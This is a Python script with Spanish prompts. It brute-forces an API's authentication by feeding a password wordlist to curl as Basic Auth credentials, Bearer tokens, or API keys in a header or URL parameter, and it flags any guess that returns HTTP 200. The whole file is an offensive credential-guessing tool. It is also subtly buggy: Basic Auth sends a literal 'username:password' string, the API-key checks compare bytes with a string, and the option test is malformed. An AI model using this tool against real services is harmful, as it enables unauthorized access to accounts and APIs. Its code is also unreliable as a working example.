import sys
import subprocess


if len(sys.argv) < 2:
    if sys.version_info >= (3,0):
        pyversion = "python3"
    else:
        pyversion = "python"

    print(f"\033[32m[>]\033[0m Uso correcto: {pyversion} {sys.argv[0]} \033[34mapi_url diccionario\033[0m")
    exit()

api_url = format(sys.argv[1])
diccionario = format(sys.argv[2])


def basic_auth():
    global diccionario, api_url, username
    print(f"Autenticacion con Basic Auth con usuario {username}")
    try:
        with open(diccionario, "r", encoding="utf-8", errors="ignore") as file:
            try:
                for password in file:
                    password = password.strip()
                    if password:
                        print(f"\033[32m[>]\033[0m curl -u '{username}:{password}' {api_url}")
                        respuesta = subprocess.check_output(["curl","-s","-o","/dev/null","-w", "%{http_code}","-u", f"username:password",api_url],text=True).strip()
                        print(f"Respuesta HTTP: \033[33m{respuesta}\033[0m")
                        if respuesta == "200":
                            print(f"Contraseña encontrada: {password}")

            except subprocess.CalledProcessError:
                pass

    except KeyboardInterrupt:
        sys.exit(1)

def bearer_auth():
    global diccionario, api_url
    print(f"Autenticacion con Bearer Token")
    try:
        with open(diccionario, "r", encoding="utf-8", errors="ignore") as file:
            try:
                for password in file:
                    password = password.strip()
                    if password:
                        print(f"\033[32m[>]\033[0m curl -H 'Authorization: Bearer {password}' {api_url}")
                        respuesta = subprocess.check_output(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "-H", f"Authorization: Bearer {password}", api_url], text=True).strip()
                        print(f"Respuesta HTTP: \033[33m{respuesta}\033[0m")
                        if respuesta == "200":
                            print(f"Contraseña encontrada: {password}")
                            break
            except subprocess.CalledProcessError:
                 pass
    except KeyboardInterrupt:
        sys.exit(1)

def api_key_header_auth():
    global diccionario, api_url
    print(f"Autenticacion con API Key en Header")
    try:
        with open(diccionario, "r", encoding="utf-8", errors="ignore") as file:
            try:
                for password in file:
                    password = password.strip()
                    if password:
                        print(f"\033[32m[>]\033[0m curl -H 'x-api-key: {password}' {api_url}")
                        respuesta = subprocess.check_output(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "-H", f"x-api-key: {password}", api_url])
                        print(f"Respuesta HTTP: \033[33m{respuesta}\033[0m")
                        if respuesta == "200":
                            print(f"Contraseña encontrada: {password}")
                            break
            except subprocess.CalledProcessError:
                 pass
    except KeyboardInterrupt:
        sys.exit(1)

def api_key_url_auth():
    global diccionario, api_url
    print(f"Autenticacion con API Key en URL")
    try:
        with open(diccionario, "r", encoding="utf-8", errors="ignore") as file:
            try:
                for password in file:
                    password = password.strip()
                    if password:
                        print(f"\033[32m[>]\033[0m curl '{api_url}?api_key={password}'")
                        respuesta = subprocess.check_output(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", f"{api_url}?api_key={password}"])
                        print(f"Respuesta HTTP: \033[33m{respuesta}\033[0m")
                        if respuesta == "200":
                            print(f"Contraseña encontrada: {password}")
                            break
            except subprocess.CalledProcessError:
                 pass
    except KeyboardInterrupt:
        sys.exit(1)

def banner():
    print()
    print(f"Selecciona el metodo de autenticacion:")
    print()
    print(f"1) Basic Auth (se require usuario)")
    print(f"2) Bearer Token")
    print(f"3) API Key en header")
    print(f"4) API Key en URL")
    print()

banner()
opcion = int(input("Ingresa la opcion (1-4): "))

if opcion == 1 and 5:
    username = input("Ingresa el nombre de usuario para Basic Auth: ")

match opcion:
    case 1:
        basic_auth()
    case 2:
        bearer_auth()
    case 3:
        api_key_header_auth()
    case 4:
        api_key_url_auth()
    case _:
        print("\033[32m[>]\033[0m \033[31mOpcion incorrecta.\033[0m")
